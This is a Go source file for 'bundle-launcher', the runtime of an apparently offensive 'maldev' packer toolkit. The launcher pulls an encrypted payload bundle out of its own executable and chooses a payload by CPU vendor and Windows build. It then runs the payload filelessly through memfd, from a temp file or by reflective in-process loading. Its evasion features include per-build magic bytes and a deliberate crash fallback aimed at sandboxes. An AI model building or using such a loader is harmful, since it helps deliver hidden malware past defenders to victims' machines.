// Command bundle-launcher is the operator-facing runtime for a C6
// multi-target bundle. Build it once, append a bundle blob via
// `packer bundle -wrap` (or [packer.AppendBundle]), and ship the
// resulting single-file executable.
//
// At runtime the launcher:
//
//  1. Reads its own binary via `os.Executable()`.
//  2. Validates the trailing footer (8-byte LE offset + "MLDV-END") via
//     [packer.ExtractBundle].
//  3. Calls [packer.MatchBundleHost] (CPUID vendor + Win build dispatch).
//  4. Decrypts the matched payload via [packer.UnpackBundle].
//  5. Writes plaintext to a memfd_create-backed FD on Linux (zero
//     on-disk artefact) or a temp file on Windows, then execs it.
//
// The launcher exits cleanly when no entry matches and the bundle's
// FallbackBehaviour is BundleFallbackExit.
//
// Usage:
//
//	# Build a generic launcher once:
//	go build -o bundle-launcher ./cmd/bundle-launcher
//
//	# Pack N target binaries into a bundle:
//	packer bundle -out bundle.bin \
//	  -pl payload-w11.exe:intel:22000-99999 \
//	  -pl payload-w10.exe:amd:10000-19999 \
//	  -pl fallback.exe:*:*-*
//
//	# Wrap the bundle into the launcher:
//	packer bundle -wrap bundle-launcher -bundle bundle.bin -out app.exe
//
//	# Ship app.exe — it dispatches at runtime:
//	./app.exe
package main

import (
	"fmt"
	"os"

	"github.com/oioio-space/maldev/pe/packer"
)

// bundleSecret is the per-build secret string the operator injects at
// compile time via:
//
//	go build -ldflags "-X main.bundleSecret=<secret>" -o bundle-launcher \
//	  ./cmd/bundle-launcher
//
// The launcher derives a [packer.BundleProfile] from this secret on
// startup and uses the per-build magic + footer to extract its
// embedded bundle. Empty (default) → falls back to canonical
// wire-format magics for back-compat with bundles wrapped without a
// secret.
//
// The matching `packer bundle -wrap` invocation must use the SAME
// secret (or none) for the magics to align — `packer bundle -wrap`
// prints the corresponding -ldflags line as a hint when given
// -secret.
var bundleSecret string

func main() {
	exe, err := os.Executable()
	if err != nil {
		fmt.Fprintln(os.Stderr, "bundle-launcher: os.Executable:", err)
		os.Exit(1)
	}
	wrapped, err := os.ReadFile(exe)
	if err != nil {
		fmt.Fprintln(os.Stderr, "bundle-launcher: read self:", err)
		os.Exit(1)
	}
	// Derive the per-build profile from the ldflags-injected secret.
	// Empty secret = canonical wire-format magics (back-compat).
	profile := packer.DeriveBundleProfile([]byte(bundleSecret))

	bundle, err := packer.ExtractBundleWith(wrapped, profile)
	if err != nil {
		fmt.Fprintln(os.Stderr, "bundle-launcher: extract:", err)
		os.Exit(1)
	}

	idx, err := packer.MatchBundleHostWith(bundle, profile)
	if err != nil {
		fmt.Fprintln(os.Stderr, "bundle-launcher: match:", err)
		os.Exit(1)
	}
	if idx < 0 {
		// Honour the bundle header's FallbackBehaviour field.
		info, err := packer.InspectBundleWith(bundle, profile)
		if err != nil {
			os.Exit(0)
		}
		switch info.FallbackBehaviour {
		case packer.BundleFallbackFirst:
			idx = 0
		case packer.BundleFallbackCrash:
			// Deliberate fault — surfaces a sandbox alert.
			var nilPtr *byte
			_ = *nilPtr
			return
		default: // BundleFallbackExit — silent clean exit.
			return
		}
	}

	plain, err := packer.UnpackBundleWith(bundle, idx, profile)
	if err != nil {
		fmt.Fprintln(os.Stderr, "bundle-launcher: unpack:", err)
		os.Exit(1)
	}

	dispatch := executePayload
	if os.Getenv("MALDEV_REFLECTIVE") == "1" {
		// In-process reflective load — no fork, no temp file, no
		// child process. Linux: maps the payload via
		// pe/packer/runtime + jumps to entry. Non-Linux: stub
		// returns ErrNotImplemented; caller can re-run without the
		// env var to fall back to memfd/temp+exec.
		dispatch = executePayloadReflective
	}
	if err := dispatch(plain, os.Args[1:]); err != nil {
		fmt.Fprintln(os.Stderr, "bundle-launcher: exec:", err)
		os.Exit(1)
	}
}
